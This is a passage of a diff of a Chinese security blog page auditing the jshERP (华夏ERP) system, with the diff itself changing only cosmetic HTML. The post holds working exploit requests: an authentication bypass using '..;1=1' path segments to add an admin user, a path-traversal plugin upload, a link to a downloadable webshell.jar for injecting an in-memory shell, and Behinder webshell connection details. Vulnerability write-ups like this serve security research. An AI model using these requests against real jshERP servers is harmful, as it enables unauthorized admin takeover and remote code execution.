 <p>添加用户后，我们即可使用admin:123456登录后台</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /jshERP-boot/webjars/swagger-ui/css/..;<span class="number">1</span>=<span class="number">1</span>/..;<span class="number">1</span>=<span class="number">1</span>/..;<span class="number">1</span>=<span class="number">1</span>/user/add HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">3000</span></span><br><span class="line">If-<span class="literal">None</span>-Match: W/<span class="string">&quot;4eb6-WjZskHod5Qc28kSz2qzMbH8uzs0&quot;</span></span><br><span class="line">Purpose: prefetch</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">139.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Sec-Purpose: prefetch</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>:<span class="number">3000</span>/login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Content-Length: <span class="number">76</span></span><br><span class="line">​</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line"><span class="string">&quot;login_name&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line"><span class="string">&quot;tenant_id&quot;</span>:<span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -258,16 +279,16 @@ github链接：[https://github.com/jishenghua/jshERP](https://github.com/jisheng
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /jshERP-boot/plugin/uploadPluginConfigFile HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span>:<span class="number">3000</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">129.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">129.0</span></span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=---------------------------<span class="number">64343665641219398361207370473</span></span><br><span class="line">X-Access-Token: 90777cf909864636a458b05de1eab2a9_0</span><br><span class="line">Content-Length: <span class="number">247</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">64343665641219398361207370473</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;configFile&quot;</span>; filename=<span class="string">&quot;../plugins/success.txt&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: text/plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success</span><br><span class="line">-----------------------------<span class="number">64343665641219398361207370473</span>--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764082269806-68c4799d-6fdd-4e0c-bcba-012a8355893d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764082269806-68c4799d-6fdd-4e0c-bcba-012a8355893d.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>进入到后台后，我们上传一个恶意的插件，即可注入内存马</p>
 <p>用<code>[https://gitee.com/xiongyi01/springboot-plugin-framework-parent](https://gitee.com/xiongyi01/springboot-plugin-framework-parent)</code>来写一个恶意的插件（我看了看代码，实际没有理解了部署jar包是怎么rce的，后续看一看）这里直接用fushuling师傅的马子来用了：<a target="_blank" rel="noopener" href="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/webshell.jar">https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/webshell.jar</a>（很好奇这种RCE方式如何通过代码审计审计出来）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764081943351-c3a50f65-5f4c-4736-a39c-54a23fde33ef.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764081943351-c3a50f65-5f4c-4736-a39c-54a23fde33ef.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>虽然显示导入失败，但是我们的马子已经注入进去了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764082496883-cc752a50-1065-4a7c-ab7e-bb5400f3f8e5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764082496883-cc752a50-1065-4a7c-ab7e-bb5400f3f8e5.png" alt="华夏ERP审计" loading="lazy"></p>
 <p>接下来我们就可以使用冰蝎进行连接了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">3000</span>/jshERP-boot/<span class="number">111</span></span><br><span class="line">rebeyond</span><br><span class="line">Referer: https://www.google.com/</span><br><span class="line">x-client-data: rebeyond</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764082742046-cb92d94f-0601-482a-b48a-1800d8123bc7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1764082742046-cb92d94f-0601-482a-b48a-1800d8123bc7.png" alt="华夏ERP审计" loading="lazy"></p>
 
       </div>
       
@@ -283,13 +304,13 @@ github链接：[https://github.com/jishenghua/jshERP](https://github.com/jisheng
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/12/10/Java%E7%8E%AF%E5%A2%83%E4%B8%8Bxxe%E7%BB%93%E5%90%88jar%E5%8D%8F%E8%AE%AE%E5%AE%9E%E7%8E%B0%E7%BC%93%E5%AD%98/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>Java环境下xxe结合jar协议实现缓存</strong>
       </a>
     
     
-      <a href="/2025/11/12/geoserver%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/11/12/geoserver%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/">
+        <span>更早一篇</span>
         <strong>geoserver历史漏洞</strong>
       </a>
     
@@ -303,9 +324,9 @@ github链接：[https://github.com/jishenghua/jshERP](https://github.com/jisheng
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
